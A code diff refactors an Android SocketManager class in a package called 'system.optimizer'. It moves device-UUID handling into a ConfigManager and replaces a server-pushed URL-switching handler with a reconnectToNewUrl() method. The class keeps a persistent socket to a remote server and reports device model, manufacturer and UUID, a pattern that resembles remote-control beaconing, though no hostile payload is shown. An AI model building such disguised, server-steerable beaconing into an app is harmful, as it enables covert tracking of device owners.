@@ -6,10 +6,7 @@ import java.util.HashMap;
 import java.util.Map;
 import java.util.UUID;
 
-import android.content.Context;
-
 import android.content.SharedPreferences;
-import com.system.optimizer.config.ConfigData;
 import com.system.optimizer.config.ConfigManager;
 import android.os.Build;
 import android.util.Log;
@@ -26,20 +23,10 @@ public class SocketManager {
 
     private final Map<String, Emitter.Listener> persistentListenerMap = new HashMap<>();
 
-    private final Context appContext;
-
     private final ConfigManager configManager;
 
-    /**
-     * Constructor that accepts a shared ConfigManager instance.
-     * 
-     * @param context       Android context (will use application context to avoid
-     *                      memory leaks)
-     * @param configManager Shared ConfigManager instance for config access and
-     *                      storage
-     */
-    public SocketManager(Context context, ConfigManager configManager) {
-        this.appContext = context.getApplicationContext();
+
+    public SocketManager(ConfigManager configManager) {
         this.configManager = configManager;
 
         opts = new Options();
@@ -69,36 +56,6 @@ public class SocketManager {
 
             socket.on(Socket.EVENT_CONNECT_ERROR, (Object... args) -> {
                 Log.e(TAG, "EVENT_CONNECT_ERROR: " + (args.length > 0 ? args[0] : "unknown"));
-            });
-
-            socket.on("config_data", (args) -> {
-                Log.d(TAG, "ConfigData event received from server");
-                if (args != null && args.length > 0) {
-                    try {
-                        org.json.JSONObject configJson = (org.json.JSONObject) args[0];
-
-                        ConfigData serverConfig = configManager.createConfigFromJson(configJson);
-                        String newServerUrl = serverConfig.getServerUrl();
-
-                        // Get current stored URL before updating config
-                        String currentServerUrl = this.configManager.getStoredServerUrl();
-
-                        Log.d(TAG, "Refreshing config data from server");
-                        this.configManager.setConfig(serverConfig);
-
-                        // Check if server URL has changed
-                        if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
-                            Log.d(TAG, "Server URL changed from " + currentServerUrl + " to " + newServerUrl);
-
-                            Log.d(TAG, "Disconnecting from current socket to reconnect to new URL");
-                            disconnect(false); // Don't clear listeners, we want to keep them for the new connection
-
-                            this.connect();
-                        }
-                    } catch (Exception e) {
-                        Log.e(TAG, "Error processing config_data from server: " + e.getMessage(), e);
-                    }
-                }
             });
         } catch (URISyntaxException e) {
             Log.e(TAG, "Malformed url", e);
@@ -197,6 +154,17 @@ public class SocketManager {
         }
     }
 
+    /**
+     * Disconnects from the current server and connects to a new server URL.
+     * Preserves all persistent listeners during the transition.
+     * Useful when the server URL has changed and a new connection is needed.
+     */
+    public synchronized void reconnectToNewUrl() {
+        Log.d(TAG, "Reconnecting to new URL...");
+        disconnect(false); // Don't clear persistent listeners
+        connect();
+    }
+
     private String buildInfo() {
         StringBuilder info = new StringBuilder();
         info.append("{");
@@ -205,20 +173,10 @@ public class SocketManager {
         info.append("\"Model\":\"").append(Build.MODEL != null ? Build.MODEL : "Unknown").append("\",");
         info.append("\"Manufacturer\":\"").append(Build.MANUFACTURER != null ? Build.MANUFACTURER : "Unknown")
                 .append("\",");
-        String uuid = getUUID(this.appContext);
+        String uuid = this.configManager.getUUID();
         info.append("\"device_uuid\":\"").append(uuid).append("\"");
         info.append("}");
         return info.toString();
-    }
-
-    private static String getUUID(Context context) {
-        SharedPreferences prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE);
-        String uuid = prefs.getString("device_uuid", null);
-        if (uuid == null) {
-            uuid = UUID.randomUUID().toString();
-            prefs.edit().putString("device_uuid", uuid).apply();
-        }
-        return uuid;
     }
 
 }
